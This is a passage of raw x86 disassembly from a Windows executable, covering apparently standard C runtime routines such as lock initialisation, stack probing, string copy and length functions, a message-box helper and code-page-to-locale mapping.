  4236df:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236e3:	add    DWORD PTR [ebp-0x1c],0x4
  4236e7:	jmp    0x4236be
  4236e9:	call   0x423893
  4236ee:	ret    
  4236ef:	call   0x423936
  4236f4:	mov    eax,ds:0x45c304
  4236f9:	cmp    eax,0xffffffff
  4236fc:	je     0x42370c
  4236fe:	push   eax
  4236ff:	call   DWORD PTR ds:0x428064
  423705:	or     DWORD PTR ds:0x45c304,0xffffffff
  42370c:	ret    
  42370d:	push   ebx
  42370e:	push   esi
  42370f:	call   DWORD PTR ds:0x428010
  423715:	push   DWORD PTR ds:0x45c304
  42371b:	mov    ebx,eax
  42371d:	call   DWORD PTR ds:0x428074
  423723:	mov    esi,eax
  423725:	test   esi,esi
  423727:	jne    0x423772
  423729:	push   0x88
  42372e:	push   0x1
  423730:	call   0x424978
  423735:	mov    esi,eax
  423737:	test   esi,esi
  423739:	pop    ecx
  42373a:	pop    ecx
  42373b:	je     0x42376a
  42373d:	push   esi
  42373e:	push   DWORD PTR ds:0x45c304
  423744:	call   DWORD PTR ds:0x428070
  42374a:	test   eax,eax
  42374c:	je     0x42376a
  42374e:	mov    DWORD PTR [esi+0x54],0x45c258
  423755:	mov    DWORD PTR [esi+0x14],0x1
  42375c:	call   DWORD PTR ds:0x42806c
  423762:	or     DWORD PTR [esi+0x4],0xffffffff
  423766:	mov    DWORD PTR [esi],eax
  423768:	jmp    0x423772
  42376a:	push   0x10
  42376c:	call   0x422920
  423771:	pop    ecx
  423772:	push   ebx
  423773:	call   DWORD PTR ds:0x428068
  423779:	mov    eax,esi
  42377b:	pop    esi
  42377c:	pop    ebx
  42377d:	ret    
  42377e:	call   0x4238ed
  423783:	test   eax,eax
  423785:	je     0x423797
  423787:	call   DWORD PTR ds:0x428078
  42378d:	cmp    eax,0xffffffff
  423790:	mov    ds:0x45c304,eax
  423795:	jne    0x42379f
  423797:	call   0x4236ef
  42379c:	xor    eax,eax
  42379e:	ret    
  42379f:	push   esi
  4237a0:	push   0x88
  4237a5:	push   0x1
  4237a7:	call   0x424978
  4237ac:	mov    esi,eax
  4237ae:	test   esi,esi
  4237b0:	pop    ecx
  4237b1:	pop    ecx
  4237b2:	je     0x4237e4
  4237b4:	push   esi
  4237b5:	push   DWORD PTR ds:0x45c304
  4237bb:	call   DWORD PTR ds:0x428070
  4237c1:	test   eax,eax
  4237c3:	je     0x4237e4
  4237c5:	mov    DWORD PTR [esi+0x54],0x45c258
  4237cc:	mov    DWORD PTR [esi+0x14],0x1
  4237d3:	call   DWORD PTR ds:0x42806c
  4237d9:	or     DWORD PTR [esi+0x4],0xffffffff
  4237dd:	mov    DWORD PTR [esi],eax
  4237df:	xor    eax,eax
  4237e1:	inc    eax
  4237e2:	pop    esi
  4237e3:	ret    
  4237e4:	call   0x4236ef
  4237e9:	xor    eax,eax
  4237eb:	pop    esi
  4237ec:	ret    
  4237ed:	cmp    DWORD PTR ds:0x45cac4,0x2
  4237f4:	jne    0x423803
  4237f6:	cmp    DWORD PTR ds:0x45cad0,0x5
  4237fd:	jb     0x423803
  4237ff:	xor    eax,eax
  423801:	inc    eax
  423802:	ret    
  423803:	push   0x3
  423805:	pop    eax
  423806:	ret    
  423807:	xor    eax,eax
  423809:	cmp    DWORD PTR [esp+0x4],eax
  42380d:	push   0x0
  42380f:	sete   al
  423812:	push   0x1000
  423817:	push   eax
  423818:	call   DWORD PTR ds:0x428080
  42381e:	test   eax,eax
  423820:	mov    ds:0x45d140,eax
  423825:	je     0x423851
  423827:	call   0x4237ed
  42382c:	cmp    eax,0x3
  42382f:	mov    ds:0x45d144,eax
  423834:	jne    0x423854
  423836:	push   0x3f8
  42383b:	call   0x424bfa
  423840:	test   eax,eax
  423842:	pop    ecx
  423843:	jne    0x423854
  423845:	push   DWORD PTR ds:0x45d140
  42384b:	call   DWORD PTR ds:0x42807c
  423851:	xor    eax,eax
  423853:	ret    
  423854:	xor    eax,eax
  423856:	inc    eax
  423857:	ret    
  423858:	push   0x425728
  42385d:	mov    eax,fs:0x0
  423863:	push   eax
  423864:	mov    eax,DWORD PTR [esp+0x10]
  423868:	mov    DWORD PTR [esp+0x10],ebp
  42386c:	lea    ebp,[esp+0x10]
  423870:	sub    esp,eax
  423872:	push   ebx
  423873:	push   esi
  423874:	push   edi
  423875:	mov    eax,DWORD PTR [ebp-0x8]
  423878:	mov    DWORD PTR [ebp-0x18],esp
  42387b:	push   eax
  42387c:	mov    eax,DWORD PTR [ebp-0x4]
  42387f:	mov    DWORD PTR [ebp-0x4],0xffffffff
  423886:	mov    DWORD PTR [ebp-0x8],eax
  423889:	lea    eax,[ebp-0x10]
  42388c:	mov    fs:0x0,eax
  423892:	ret    
  423893:	mov    ecx,DWORD PTR [ebp-0x10]
  423896:	mov    DWORD PTR fs:0x0,ecx
  42389d:	pop    ecx
  42389e:	pop    edi
  42389f:	pop    esi
  4238a0:	pop    ebx
  4238a1:	leave  
  4238a2:	push   ecx
  4238a3:	ret    
  4238a4:	int3   
  4238a5:	int3   
  4238a6:	int3   
  4238a7:	int3   
  4238a8:	int3   
  4238a9:	int3   
  4238aa:	int3   
  4238ab:	int3   
  4238ac:	int3   
  4238ad:	int3   
  4238ae:	int3   
  4238af:	int3   
  4238b0:	cmp    eax,0x1000
  4238b5:	jae    0x4238c5
  4238b7:	neg    eax
  4238b9:	add    eax,esp
  4238bb:	add    eax,0x4
  4238be:	test   DWORD PTR [eax],eax
  4238c0:	xchg   esp,eax
  4238c1:	mov    eax,DWORD PTR [eax]
  4238c3:	push   eax
  4238c4:	ret    
  4238c5:	push   ecx
  4238c6:	lea    ecx,[esp+0x8]
  4238ca:	sub    ecx,0x1000
  4238d0:	sub    eax,0x1000
  4238d5:	test   DWORD PTR [ecx],eax
  4238d7:	cmp    eax,0x1000
  4238dc:	jae    0x4238ca
  4238de:	sub    ecx,eax
  4238e0:	mov    eax,esp
  4238e2:	test   DWORD PTR [ecx],eax
  4238e4:	mov    esp,ecx
  4238e6:	mov    ecx,DWORD PTR [eax]
  4238e8:	mov    eax,DWORD PTR [eax+0x4]
  4238eb:	push   eax
  4238ec:	ret    
  4238ed:	push   esi
  4238ee:	push   edi
  4238ef:	xor    esi,esi
  4238f1:	mov    edi,0x45cc20
  4238f6:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  4238fe:	jne    0x42391e
  423900:	lea    eax,[esi*8+0x45c310]
  423907:	mov    DWORD PTR [eax],edi
  423909:	push   0xfa0
  42390e:	push   DWORD PTR [eax]
  423910:	add    edi,0x18
  423913:	call   0x4248ed
  423918:	test   eax,eax
  42391a:	pop    ecx
  42391b:	pop    ecx
  42391c:	je     0x42392a
  42391e:	inc    esi
  42391f:	cmp    esi,0x24
  423922:	jl     0x4238f6
  423924:	xor    eax,eax
  423926:	inc    eax
  423927:	pop    edi
  423928:	pop    esi
  423929:	ret    
  42392a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423932:	xor    eax,eax
  423934:	jmp    0x423927
  423936:	push   ebx
  423937:	mov    ebx,DWORD PTR ds:0x428060
  42393d:	push   esi
  42393e:	mov    esi,0x45c310
  423943:	push   edi
  423944:	mov    edi,DWORD PTR [esi]
  423946:	test   edi,edi
  423948:	je     0x42395d
  42394a:	cmp    DWORD PTR [esi+0x4],0x1
  42394e:	je     0x42395d
  423950:	push   edi
  423951:	call   ebx
  423953:	push   edi
  423954:	call   0x42446a
  423959:	and    DWORD PTR [esi],0x0
  42395c:	pop    ecx
  42395d:	add    esi,0x8
  423960:	cmp    esi,0x45c430
  423966:	jl     0x423944
  423968:	mov    esi,0x45c310
  42396d:	pop    edi
  42396e:	mov    eax,DWORD PTR [esi]
  423970:	test   eax,eax
  423972:	je     0x42397d
  423974:	cmp    DWORD PTR [esi+0x4],0x1
  423978:	jne    0x42397d
  42397a:	push   eax
  42397b:	call   ebx
  42397d:	add    esi,0x8
  423980:	cmp    esi,0x45c430
  423986:	jl     0x42396e
  423988:	pop    esi
  423989:	pop    ebx
  42398a:	ret    
  42398b:	push   ebp
  42398c:	mov    ebp,esp
  42398e:	mov    eax,DWORD PTR [ebp+0x8]
  423991:	push   DWORD PTR [eax*8+0x45c310]
  423998:	call   DWORD PTR ds:0x42808c
  42399e:	pop    ebp
  42399f:	ret    
  4239a0:	push   ebp
  4239a1:	mov    ebp,esp
  4239a3:	push   esi
  4239a4:	mov    esi,DWORD PTR [ebp+0x8]
  4239a7:	lea    esi,[esi*8+0x45c310]
  4239ae:	cmp    DWORD PTR [esi],0x0
  4239b1:	je     0x4239b8
  4239b3:	xor    eax,eax
  4239b5:	inc    eax
  4239b6:	jmp    0x423a1c
  4239b8:	push   edi
  4239b9:	push   0x18
  4239bb:	call   0x424582
  4239c0:	mov    edi,eax
  4239c2:	test   edi,edi
  4239c4:	pop    ecx
  4239c5:	jne    0x4239d6
  4239c7:	call   0x425800
  4239cc:	mov    DWORD PTR [eax],0xc
  4239d2:	xor    eax,eax
  4239d4:	jmp    0x423a1b
  4239d6:	push   0xa
  4239d8:	call   0x423a1f
  4239dd:	cmp    DWORD PTR [esi],0x0
  4239e0:	pop    ecx
  4239e1:	jne    0x423a09
  4239e3:	push   0xfa0
  4239e8:	push   edi
  4239e9:	call   0x4248ed
  4239ee:	test   eax,eax
  4239f0:	pop    ecx
  4239f1:	pop    ecx
  4239f2:	jne    0x423a05
  4239f4:	push   edi
  4239f5:	call   0x42446a
  4239fa:	push   0xa
  4239fc:	call   0x42398b
  423a01:	pop    ecx
  423a02:	pop    ecx
  423a03:	jmp    0x4239c7
  423a05:	mov    DWORD PTR [esi],edi
  423a07:	jmp    0x423a10
  423a09:	push   edi
  423a0a:	call   0x42446a
  423a0f:	pop    ecx
  423a10:	push   0xa
  423a12:	call   0x42398b
  423a17:	xor    eax,eax
  423a19:	pop    ecx
  423a1a:	inc    eax
  423a1b:	pop    edi
  423a1c:	pop    esi
  423a1d:	pop    ebp
  423a1e:	ret    
  423a1f:	push   ebp
  423a20:	mov    ebp,esp
  423a22:	mov    eax,DWORD PTR [ebp+0x8]
  423a25:	push   esi
  423a26:	lea    esi,[eax*8+0x45c310]
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	jne    0x423a45
  423a32:	push   eax
  423a33:	call   0x4239a0
  423a38:	test   eax,eax
  423a3a:	pop    ecx
  423a3b:	jne    0x423a45
  423a3d:	push   0x11
  423a3f:	call   0x422920
  423a44:	pop    ecx
  423a45:	push   DWORD PTR [esi]
  423a47:	call   DWORD PTR ds:0x428090
  423a4d:	pop    esi
  423a4e:	pop    ebp
  423a4f:	ret    
  423a50:	push   esi
  423a51:	push   DWORD PTR ds:0x45d268
  423a57:	call   0x4259b6
  423a5c:	pop    ecx
  423a5d:	mov    ecx,DWORD PTR ds:0x45d264
  423a63:	mov    esi,eax
  423a65:	mov    eax,ds:0x45d268
  423a6a:	mov    edx,ecx
  423a6c:	sub    edx,eax
  423a6e:	add    edx,0x4
  423a71:	cmp    esi,edx
  423a73:	jae    0x423ac3
  423a75:	mov    ecx,0x800
  423a7a:	cmp    esi,ecx
  423a7c:	jae    0x423a80
  423a7e:	mov    ecx,esi
  423a80:	add    ecx,esi
  423a82:	push   ecx
  423a83:	push   eax
  423a84:	call   0x425809
  423a89:	test   eax,eax
  423a8b:	pop    ecx
  423a8c:	pop    ecx
  423a8d:	jne    0x423aa6
  423a8f:	add    esi,0x10
  423a92:	push   esi
  423a93:	push   DWORD PTR ds:0x45d268
  423a99:	call   0x425809
  423a9e:	test   eax,eax
  423aa0:	pop    ecx
  423aa1:	pop    ecx
  423aa2:	jne    0x423aa6
  423aa4:	pop    esi
  423aa5:	ret    
  423aa6:	mov    ecx,DWORD PTR ds:0x45d264
  423aac:	sub    ecx,DWORD PTR ds:0x45d268
  423ab2:	mov    ds:0x45d268,eax
  423ab7:	sar    ecx,0x2
  423aba:	lea    ecx,[eax+ecx*4]
  423abd:	mov    DWORD PTR ds:0x45d264,ecx
  423ac3:	mov    DWORD PTR [ecx],edi
  423ac5:	add    DWORD PTR ds:0x45d264,0x4
  423acc:	mov    eax,edi
  423ace:	pop    esi
  423acf:	ret    
  423ad0:	push   0x80
  423ad5:	call   0x424582
  423ada:	test   eax,eax
  423adc:	pop    ecx
  423add:	mov    ds:0x45d268,eax
  423ae2:	jne    0x423ae8
  423ae4:	push   0x18
  423ae6:	pop    eax
  423ae7:	ret    
  423ae8:	and    DWORD PTR [eax],0x0
  423aeb:	mov    eax,ds:0x45d268
  423af0:	mov    ds:0x45d264,eax
  423af5:	xor    eax,eax
  423af7:	ret    
  423af8:	push   0xc
  423afa:	push   0x4284c0
  423aff:	call   0x423858
  423b04:	call   0x422b6b
  423b09:	and    DWORD PTR [ebp-0x4],0x0
  423b0d:	mov    edi,DWORD PTR [ebp+0x8]
  423b10:	call   0x423a50
  423b15:	mov    DWORD PTR [ebp-0x1c],eax
  423b18:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b1c:	call   0x423b2a
  423b21:	mov    eax,DWORD PTR [ebp-0x1c]
  423b24:	call   0x423893
  423b29:	ret    
  423b2a:	call   0x422b74
  423b2f:	ret    
  423b30:	push   DWORD PTR [esp+0x4]
  423b34:	call   0x423af8
  423b39:	neg    eax
  423b3b:	sbb    eax,eax
  423b3d:	neg    eax
  423b3f:	pop    ecx
  423b40:	dec    eax
  423b41:	ret    
  423b42:	push   ebp
  423b43:	mov    ebp,esp
  423b45:	sub    esp,0x10
  423b48:	push   ebx
  423b49:	xor    ebx,ebx
  423b4b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423b51:	push   esi
  423b52:	push   edi
  423b53:	jne    0x423bc2
  423b55:	push   0x428530
  423b5a:	call   DWORD PTR ds:0x428094
  423b60:	mov    edi,eax
  423b62:	cmp    edi,ebx
  423b64:	je     0x423bfd
  423b6a:	mov    esi,DWORD PTR ds:0x428018
  423b70:	push   0x428524
  423b75:	push   edi
  423b76:	call   esi
  423b78:	test   eax,eax
  423b7a:	mov    ds:0x45cd70,eax
  423b7f:	je     0x423bfd
  423b81:	push   0x428514
  423b86:	push   edi
  423b87:	call   esi
  423b89:	push   0x428500
  423b8e:	push   edi
  423b8f:	mov    ds:0x45cd74,eax
  423b94:	call   esi
  423b96:	cmp    DWORD PTR ds:0x45cac4,0x2
  423b9d:	mov    ds:0x45cd78,eax
  423ba2:	jne    0x423bc2
  423ba4:	push   0x4284e4
  423ba9:	push   edi
  423baa:	call   esi
  423bac:	test   eax,eax
  423bae:	mov    ds:0x45cd80,eax
  423bb3:	je     0x423bc2
  423bb5:	push   0x4284cc
  423bba:	push   edi
  423bbb:	call   esi
  423bbd:	mov    ds:0x45cd7c,eax
  423bc2:	mov    eax,ds:0x45cd7c
  423bc7:	test   eax,eax
  423bc9:	je     0x423c07
  423bcb:	call   eax
  423bcd:	test   eax,eax
  423bcf:	je     0x423bee
  423bd1:	lea    ecx,[ebp-0x4]
  423bd4:	push   ecx
  423bd5:	push   0xc
  423bd7:	lea    ecx,[ebp-0x10]
  423bda:	push   ecx
  423bdb:	push   0x1
  423bdd:	push   eax
  423bde:	call   DWORD PTR ds:0x45cd80
  423be4:	test   eax,eax
  423be6:	je     0x423bee
  423be8:	test   BYTE PTR [ebp-0x8],0x1
  423bec:	jne    0x423c07
  423bee:	cmp    DWORD PTR ds:0x45cad0,0x4
  423bf5:	jb     0x423c01
  423bf7:	or     BYTE PTR [ebp+0x12],0x20
  423bfb:	jmp    0x423c26
  423bfd:	xor    eax,eax
  423bff:	jmp    0x423c36
  423c01:	or     BYTE PTR [ebp+0x12],0x4
  423c05:	jmp    0x423c26
  423c07:	mov    eax,ds:0x45cd74
  423c0c:	test   eax,eax
  423c0e:	je     0x423c26
  423c10:	call   eax
  423c12:	mov    ebx,eax
  423c14:	test   ebx,ebx
  423c16:	je     0x423c26
  423c18:	mov    eax,ds:0x45cd78
  423c1d:	test   eax,eax
  423c1f:	je     0x423c26
  423c21:	push   ebx
  423c22:	call   eax
  423c24:	mov    ebx,eax
  423c26:	push   DWORD PTR [ebp+0x10]
  423c29:	push   DWORD PTR [ebp+0xc]
  423c2c:	push   DWORD PTR [ebp+0x8]
  423c2f:	push   ebx
  423c30:	call   DWORD PTR ds:0x45cd70
  423c36:	pop    edi
  423c37:	pop    esi
  423c38:	pop    ebx
  423c39:	leave  
  423c3a:	ret    
  423c3b:	int3   
  423c3c:	int3   
  423c3d:	int3   
  423c3e:	int3   
  423c3f:	int3   
  423c40:	push   edi
  423c41:	mov    edi,DWORD PTR [esp+0x8]
  423c45:	jmp    0x423cb5
  423c47:	lea    esp,[esp+0x0]
  423c4e:	mov    edi,edi
  423c50:	mov    ecx,DWORD PTR [esp+0x4]
  423c54:	push   edi
  423c55:	test   ecx,0x3
  423c5b:	je     0x423c70
  423c5d:	mov    al,BYTE PTR [ecx]
  423c5f:	add    ecx,0x1
  423c62:	test   al,al
  423c64:	je     0x423ca3
  423c66:	test   ecx,0x3
  423c6c:	jne    0x423c5d
  423c6e:	mov    edi,edi
  423c70:	mov    eax,DWORD PTR [ecx]
  423c72:	mov    edx,0x7efefeff
  423c77:	add    edx,eax
  423c79:	xor    eax,0xffffffff
  423c7c:	xor    eax,edx
  423c7e:	add    ecx,0x4
  423c81:	test   eax,0x81010100
  423c86:	je     0x423c70
  423c88:	mov    eax,DWORD PTR [ecx-0x4]
  423c8b:	test   al,al
  423c8d:	je     0x423cb2
  423c8f:	test   ah,ah
  423c91:	je     0x423cad
  423c93:	test   eax,0xff0000
  423c98:	je     0x423ca8
  423c9a:	test   eax,0xff000000
  423c9f:	je     0x423ca3
  423ca1:	jmp    0x423c70
  423ca3:	lea    edi,[ecx-0x1]
  423ca6:	jmp    0x423cb5
  423ca8:	lea    edi,[ecx-0x2]
  423cab:	jmp    0x423cb5
  423cad:	lea    edi,[ecx-0x3]
  423cb0:	jmp    0x423cb5
  423cb2:	lea    edi,[ecx-0x4]
  423cb5:	mov    ecx,DWORD PTR [esp+0xc]
  423cb9:	test   ecx,0x3
  423cbf:	je     0x423cde
  423cc1:	mov    dl,BYTE PTR [ecx]
  423cc3:	add    ecx,0x1
  423cc6:	test   dl,dl
  423cc8:	je     0x423d30
  423cca:	mov    BYTE PTR [edi],dl
  423ccc:	add    edi,0x1
  423ccf:	test   ecx,0x3
  423cd5:	jne    0x423cc1
  423cd7:	jmp    0x423cde
  423cd9:	mov    DWORD PTR [edi],edx
  423cdb:	add    edi,0x4
  423cde:	mov    edx,0x7efefeff
  423ce3:	mov    eax,DWORD PTR [ecx]
  423ce5:	add    edx,eax
  423ce7:	xor    eax,0xffffffff
  423cea:	xor    eax,edx
  423cec:	mov    edx,DWORD PTR [ecx]
  423cee:	add    ecx,0x4
  423cf1:	test   eax,0x81010100
  423cf6:	je     0x423cd9
  423cf8:	test   dl,dl
  423cfa:	je     0x423d30
  423cfc:	test   dh,dh
  423cfe:	je     0x423d27
  423d00:	test   edx,0xff0000
  423d06:	je     0x423d1a
  423d08:	test   edx,0xff000000
  423d0e:	je     0x423d12
  423d10:	jmp    0x423cd9
  423d12:	mov    DWORD PTR [edi],edx
  423d14:	mov    eax,DWORD PTR [esp+0x8]
  423d18:	pop    edi
  423d19:	ret    
  423d1a:	mov    WORD PTR [edi],dx
  423d1d:	mov    eax,DWORD PTR [esp+0x8]
  423d21:	mov    BYTE PTR [edi+0x2],0x0
  423d25:	pop    edi
  423d26:	ret    
  423d27:	mov    WORD PTR [edi],dx
  423d2a:	mov    eax,DWORD PTR [esp+0x8]
  423d2e:	pop    edi
  423d2f:	ret    
  423d30:	mov    BYTE PTR [edi],dl
  423d32:	mov    eax,DWORD PTR [esp+0x8]
  423d36:	pop    edi
  423d37:	ret    
  423d38:	int3   
  423d39:	int3   
  423d3a:	int3   
  423d3b:	int3   
  423d3c:	int3   
  423d3d:	int3   
  423d3e:	int3   
  423d3f:	int3   
  423d40:	mov    ecx,DWORD PTR [esp+0xc]
  423d44:	push   edi
  423d45:	test   ecx,ecx
  423d47:	je     0x423ddf
  423d4d:	push   esi
  423d4e:	push   ebx
  423d4f:	mov    ebx,ecx
  423d51:	mov    esi,DWORD PTR [esp+0x14]
  423d55:	test   esi,0x3
  423d5b:	mov    edi,DWORD PTR [esp+0x10]
  423d5f:	jne    0x423d6c
  423d61:	shr    ecx,0x2
  423d64:	jne    0x423def
  423d6a:	jmp    0x423d93
  423d6c:	mov    al,BYTE PTR [esi]
  423d6e:	add    esi,0x1
  423d71:	mov    BYTE PTR [edi],al
  423d73:	add    edi,0x1
  423d76:	sub    ecx,0x1
  423d79:	je     0x423da6
  423d7b:	test   al,al
  423d7d:	je     0x423dae
  423d7f:	test   esi,0x3
  423d85:	jne    0x423d6c
  423d87:	mov    ebx,ecx
  423d89:	shr    ecx,0x2
  423d8c:	jne    0x423def
  423d8e:	and    ebx,0x3
  423d91:	je     0x423da6
  423d93:	mov    al,BYTE PTR [esi]
  423d95:	add    esi,0x1
  423d98:	mov    BYTE PTR [edi],al
  423d9a:	add    edi,0x1
  423d9d:	test   al,al
  423d9f:	je     0x423dd8
  423da1:	sub    ebx,0x1
  423da4:	jne    0x423d93
  423da6:	mov    eax,DWORD PTR [esp+0x10]
  423daa:	pop    ebx
  423dab:	pop    esi
  423dac:	pop    edi
  423dad:	ret    
  423dae:	test   edi,0x3
  423db4:	je     0x423dcc
  423db6:	mov    BYTE PTR [edi],al
  423db8:	add    edi,0x1
  423dbb:	sub    ecx,0x1
  423dbe:	je     0x423e5c
  423dc4:	test   edi,0x3
  423dca:	jne    0x423db6
  423dcc:	mov    ebx,ecx
  423dce:	shr    ecx,0x2
  423dd1:	jne    0x423e47
  423dd3:	mov    BYTE PTR [edi],al
  423dd5:	add    edi,0x1
  423dd8:	sub    ebx,0x1
  423ddb:	jne    0x423dd3
  423ddd:	pop    ebx
  423dde:	pop    esi
  423ddf:	mov    eax,DWORD PTR [esp+0x8]
  423de3:	pop    edi
  423de4:	ret    
  423de5:	mov    DWORD PTR [edi],edx
  423de7:	add    edi,0x4
  423dea:	sub    ecx,0x1
  423ded:	je     0x423d8e
  423def:	mov    edx,0x7efefeff
  423df4:	mov    eax,DWORD PTR [esi]
  423df6:	add    edx,eax
  423df8:	xor    eax,0xffffffff
  423dfb:	xor    eax,edx
  423dfd:	mov    edx,DWORD PTR [esi]
  423dff:	add    esi,0x4
  423e02:	test   eax,0x81010100
  423e07:	je     0x423de5
  423e09:	test   dl,dl
  423e0b:	je     0x423e39
  423e0d:	test   dh,dh
  423e0f:	je     0x423e2f
  423e11:	test   edx,0xff0000
  423e17:	je     0x423e25
  423e19:	test   edx,0xff000000
  423e1f:	jne    0x423de5
  423e21:	mov    DWORD PTR [edi],edx
  423e23:	jmp    0x423e3d
  423e25:	and    edx,0xffff
  423e2b:	mov    DWORD PTR [edi],edx
  423e2d:	jmp    0x423e3d
  423e2f:	and    edx,0xff
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	jmp    0x423e3d
  423e39:	xor    edx,edx
  423e3b:	mov    DWORD PTR [edi],edx
  423e3d:	add    edi,0x4
  423e40:	xor    eax,eax
  423e42:	sub    ecx,0x1
  423e45:	je     0x423e53
  423e47:	xor    eax,eax
  423e49:	mov    DWORD PTR [edi],eax
  423e4b:	add    edi,0x4
  423e4e:	sub    ecx,0x1
  423e51:	jne    0x423e49
  423e53:	and    ebx,0x3
  423e56:	jne    0x423dd3
  423e5c:	mov    eax,DWORD PTR [esp+0x10]
  423e60:	pop    ebx
  423e61:	pop    esi
  423e62:	pop    edi
  423e63:	ret    
  423e64:	int3   
  423e65:	int3   
  423e66:	int3   
  423e67:	int3   
  423e68:	int3   
  423e69:	int3   
  423e6a:	int3   
  423e6b:	int3   
  423e6c:	int3   
  423e6d:	int3   
  423e6e:	int3   
  423e6f:	int3   
  423e70:	mov    ecx,DWORD PTR [esp+0x4]
  423e74:	test   ecx,0x3
  423e7a:	je     0x423ea0
  423e7c:	mov    al,BYTE PTR [ecx]
  423e7e:	add    ecx,0x1
  423e81:	test   al,al
  423e83:	je     0x423ed3
  423e85:	test   ecx,0x3
  423e8b:	jne    0x423e7c
  423e8d:	add    eax,0x0
  423e92:	lea    esp,[esp+0x0]
  423e99:	lea    esp,[esp+0x0]
  423ea0:	mov    eax,DWORD PTR [ecx]
  423ea2:	mov    edx,0x7efefeff
  423ea7:	add    edx,eax
  423ea9:	xor    eax,0xffffffff
  423eac:	xor    eax,edx
  423eae:	add    ecx,0x4
  423eb1:	test   eax,0x81010100
  423eb6:	je     0x423ea0
  423eb8:	mov    eax,DWORD PTR [ecx-0x4]
  423ebb:	test   al,al
  423ebd:	je     0x423ef1
  423ebf:	test   ah,ah
  423ec1:	je     0x423ee7
  423ec3:	test   eax,0xff0000
  423ec8:	je     0x423edd
  423eca:	test   eax,0xff000000
  423ecf:	je     0x423ed3
  423ed1:	jmp    0x423ea0
  423ed3:	lea    eax,[ecx-0x1]
  423ed6:	mov    ecx,DWORD PTR [esp+0x4]
  423eda:	sub    eax,ecx
  423edc:	ret    
  423edd:	lea    eax,[ecx-0x2]
  423ee0:	mov    ecx,DWORD PTR [esp+0x4]
  423ee4:	sub    eax,ecx
  423ee6:	ret    
  423ee7:	lea    eax,[ecx-0x3]
  423eea:	mov    ecx,DWORD PTR [esp+0x4]
  423eee:	sub    eax,ecx
  423ef0:	ret    
  423ef1:	lea    eax,[ecx-0x4]
  423ef4:	mov    ecx,DWORD PTR [esp+0x4]
  423ef8:	sub    eax,ecx
  423efa:	ret    
  423efb:	push   0x8
  423efd:	push   0x428540
  423f02:	call   0x423858
  423f07:	and    DWORD PTR [ebp-0x4],0x0
  423f0b:	push   0x0
  423f0d:	push   0x1
  423f0f:	call   0x425a82
  423f14:	pop    ecx
  423f15:	pop    ecx
  423f16:	jmp    0x423f1f
  423f18:	xor    eax,eax
  423f1a:	inc    eax
  423f1b:	ret    
  423f1c:	mov    esp,DWORD PTR [ebp-0x18]
  423f1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f23:	push   0x3
  423f25:	call   DWORD PTR ds:0x428028
  423f2b:	int3   
  423f2c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f32:	jne    0x423f35
  423f34:	ret    
  423f35:	jmp    0x423efb
  423f3a:	movzx  eax,BYTE PTR [esp+0x4]
  423f3f:	mov    cl,BYTE PTR [esp+0xc]
  423f43:	test   BYTE PTR [eax+0x45cf21],cl
  423f49:	jne    0x423f67
  423f4b:	cmp    DWORD PTR [esp+0x8],0x0
  423f50:	je     0x423f60
  423f52:	movzx  eax,WORD PTR [eax*2+0x42893a]
  423f5a:	and    eax,DWORD PTR [esp+0x8]
  423f5e:	jmp    0x423f62
  423f60:	xor    eax,eax
  423f62:	test   eax,eax
  423f64:	jne    0x423f67
  423f66:	ret    
  423f67:	xor    eax,eax
  423f69:	inc    eax
  423f6a:	ret    
  423f6b:	push   0x4
  423f6d:	push   0x0
  423f6f:	push   DWORD PTR [esp+0xc]
  423f73:	call   0x423f3a
  423f78:	add    esp,0xc
  423f7b:	ret    
  423f7c:	sub    eax,0x3a4
  423f81:	je     0x423fa5
  423f83:	sub    eax,0x4
  423f86:	je     0x423f9f
  423f88:	sub    eax,0xd
  423f8b:	je     0x423f99
  423f8d:	dec    eax
  423f8e:	je     0x423f93
  423f90:	xor    eax,eax
  423f92:	ret    
  423f93:	mov    eax,0x404
  423f98:	ret    
  423f99:	mov    eax,0x412
  423f9e:	ret    
  423f9f:	mov    eax,0x804
  423fa4:	ret    
  423fa5:	mov    eax,0x411
  423faa:	ret    
  423fab:	push   edi
  423fac:	push   0x40
  423fae:	xor    eax,eax
  423fb0:	pop    ecx
  423fb1:	mov    edi,0x45cf20
  423fb6:	rep stos DWORD PTR es:[edi],eax
  423fb8:	stos   BYTE PTR es:[edi],al
  423fb9:	xor    eax,eax
  423fbb:	mov    ds:0x45d024,eax
  423fc0:	mov    ds:0x45cf1c,eax
  423fc5:	mov    ds:0x45cf14,eax
  423fca:	mov    edi,0x45d030
  423fcf:	stos   DWORD PTR es:[edi],eax
  423fd0:	stos   DWORD PTR es:[edi],eax
  423fd1:	stos   DWORD PTR es:[edi],eax
  423fd2:	pop    edi
  423fd3:	ret    
  423fd4:	push   ebp
  423fd5:	mov    ebp,esp
  423fd7:	sub    esp,0x518
  423fdd:	mov    eax,ds:0x45c430
  423fe2:	xor    eax,DWORD PTR [ebp+0x4]
  423fe5:	push   esi
  423fe6:	mov    DWORD PTR [ebp-0x4],eax
  423fe9:	lea    eax,[ebp-0x18]
  423fec:	push   eax
  423fed:	push   DWORD PTR ds:0x45d024
  423ff3:	call   DWORD PTR ds:0x4280a0
  423ff9:	cmp    eax,0x1
  423ffc:	mov    esi,0x100
  424001:	jne    0x424114
  424007:	xor    eax,eax
  424009:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424010:	inc    eax
  424011:	cmp    eax,esi
  424013:	jb     0x424009
  424015:	mov    al,BYTE PTR [ebp-0x12]
  424018:	test   al,al
  42401a:	mov    BYTE PTR [ebp-0x118],0x20
  424021:	je     0x424059
  424023:	push   ebx
  424024:	lea    edx,[ebp-0x11]
  424027:	push   edi
  424028:	movzx  ecx,BYTE PTR [edx]
  42402b:	movzx  eax,al
  42402e:	cmp    eax,ecx
  424030:	ja     0x42404f
  424032:	sub    ecx,eax
  424034:	inc    ecx
  424035:	mov    ebx,ecx
  424037:	shr    ecx,0x2
  42403a:	lea    edi,[ebp+eax*1-0x118]
  424041:	mov    eax,0x20202020
  424046:	rep stos DWORD PTR es:[edi],eax
  424048:	mov    ecx,ebx
  42404a:	and    ecx,0x3
  42404d:	rep stos BYTE PTR es:[edi],al
  42404f:	inc    edx
